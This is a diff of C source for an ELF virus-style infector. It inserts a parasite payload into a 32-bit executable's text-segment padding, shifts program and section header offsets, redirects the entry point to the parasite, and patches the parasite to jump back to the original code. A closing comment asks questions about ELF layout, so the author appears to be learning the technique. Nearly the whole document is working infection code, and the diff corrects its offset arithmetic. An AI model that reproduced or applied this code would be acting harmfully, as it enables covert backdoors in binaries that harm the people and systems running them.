@@ -57,12 +57,6 @@ int main(int argc, char **argv)
         exit(-1);
     }
 
-    infect_elf();
-}
-
-void infect_elf()
-{
-    
     unsigned long entry_point, text_offset, text_begin;
     unsigned char *mem;
     unsigned int entry_offset;
@@ -92,7 +86,7 @@ void infect_elf()
 
     e_hdr = (Elf32_Ehdr *) mem;
     entry_point = e_hdr->e_entry;
-    ehdr_size = sizeof(Elf32_Ehdr);
+    ehdr_size = sizeof(*e_hdr);
 
     if (DEBUG)
     {
@@ -111,12 +105,9 @@ void infect_elf()
     // iterate over phdrs looking for the text segment
     for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
     {
-        if (text_found)
+        if (text_found) //&& p_hdr->p_offset >= entry_offset)
         {
-            // while (psize > PAGE_SIZE) {
             p_hdr->p_offset += PAGE_SIZE;
-            // p_hdr->p_vaddr += PAGE_SIZE;
-            // psize -= PAGE_SIZE
         }
 
         if (p_hdr->p_type == PT_LOAD)
@@ -125,7 +116,7 @@ void infect_elf()
                 text_found++;
                 text_offset = p_hdr->p_offset; // offset of text segment on file
                 text_begin = p_hdr->p_vaddr; 
-                entry_offset = p_hdr->p_filesz; // offset to make correct entry point
+                entry_offset = p_hdr->p_filesz; // offset to parasite entry point
                 p_hdr->p_filesz += psize;
                 p_hdr->p_memsz += psize;
                 if (DEBUG)
@@ -138,18 +129,18 @@ void infect_elf()
             }
     }
 
-    // push section header table
-    e_hdr->e_shoff += PAGE_SIZE;
 
     s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
     for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
     {
-        if (s_hdr->sh_offset > (entry_offset + psize))
+        if (s_hdr->sh_offset >= text_offset + entry_offset)
         {
             s_hdr->sh_offset += PAGE_SIZE;
         }
     }
 
+    // push section header table
+    e_hdr->e_shoff += PAGE_SIZE;
 
     // modify entry_point to point to parasite at the end of .text
     e_hdr->e_entry = text_begin + entry_offset;
@@ -158,23 +149,25 @@ void infect_elf()
         printf("set entry point to 0x%x\n", e_hdr->e_entry);
     }
     // read parasite into buffer
-    if (read(pfd, buf, MAX_PARASITE) == -1)
+    // I know this is a bad 
+    if (read(pfd, buf, psize) == -1)
     {
         perror("parasite: read");
         exit(-1);
     }
 
-    int preparasite_size = ehdr_size + text_offset + entry_offset;
+    int preparasite_size_file = text_offset + entry_offset;
+    int preparasite_size_image =  entry_offset - text_offset;
     if (DEBUG)
     {
-        printf("preparasite_size = 0x%x\n", preparasite_size);
+        printf("preparasite_size_file = 0x%x\n", preparasite_size_file);
+        printf("preparasite_size_image = 0x%x\n", preparasite_size_image);
     }
 
     // patch parasite code
     *(unsigned long *)&buf[patch_position] = entry_point;
     printf("Patching parasite to jmp to %x\n", entry_point);
 
-    // begin writing 
     if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, hst.st_mode)) == -1)
     {
         perror("tmp binary: open");
@@ -183,7 +176,7 @@ void infect_elf()
 
     unsigned int wrote;
 
-    if ((wrote = write(ofd, mem, preparasite_size)) != preparasite_size)
+    if ((wrote = write(ofd, mem, preparasite_size_file)) != preparasite_size_file)
     {
         perror("tmp binary: write contents up to parasite");
         exit(-1);
@@ -193,7 +186,7 @@ void infect_elf()
         printf("wrote 0x%x bytes of preparasite information\n", wrote);
     }
 
-    if ((wrote = write(ofd, buf, psize)) < 0) 
+    if ((wrote = write(ofd, buf, psize)) != psize) 
     {
         perror("tmp binary: write parasite");
         exit(-1);
@@ -205,16 +198,17 @@ void infect_elf()
 
     if (DEBUG) 
     {
-        printf("about to write 0x%x bytes to pad to PAGE_SIZE\n", PAGE_SIZE-(preparasite_size + psize));
+        printf("about to write 0x%x bytes to pad to PAGE_SIZE\n", PAGE_SIZE-psize);
     }
-    if (lseek(ofd, PAGE_SIZE-(preparasite_size + psize) , SEEK_SET) < 0)
+    // Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
+    if (lseek(ofd, PAGE_SIZE-psize, SEEK_CUR) < 0)
     {
         perror("seek");
         exit(-1);
     }
 
-    mem += ehdr_size + text_offset + entry_offset + psize;
-    if (write(ofd, mem, hst.st_size-preparasite_size) != hst.st_size-preparasite_size)
+    mem += text_offset + entry_offset;
+    if (write(ofd, mem, hst.st_size-preparasite_size_file) != hst.st_size-preparasite_size_file)
     {
         perror("tmp binary: write post injection");
         exit(-1);
@@ -223,4 +217,20 @@ void infect_elf()
     close(ofd);
     
 }
+
+/* questions about ELF:
+ * how does this work?
+ *   Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+ *   LOAD           0x000000 0x08048000 0x08048000 0x005d0 0x005d0 R E 0x1000
+ *   LOAD           0x0005d0 0x080495d0 0x080495d0 0x0011c 0x00120 RW  0x1000
+ *   DYNAMIC        0x0005dc 0x080495dc 0x080495dc 0x000e8 0x000e8 RW  0x4
+ *
+ * particularly how can the DYNAMIC segment exist only 12 bytes in the file after
+ * the data segment while the data segment's FileSiz is 284 bytes? Can segment's
+ * exist within each other?
+ *
+ * any tool recommendations for inspecting the structure of the elf without abiding
+ * by the elf headers? I'm using hexdump right now to make sure I padded up to 
+ * PAGE_SIZE correctly.
+ */
 
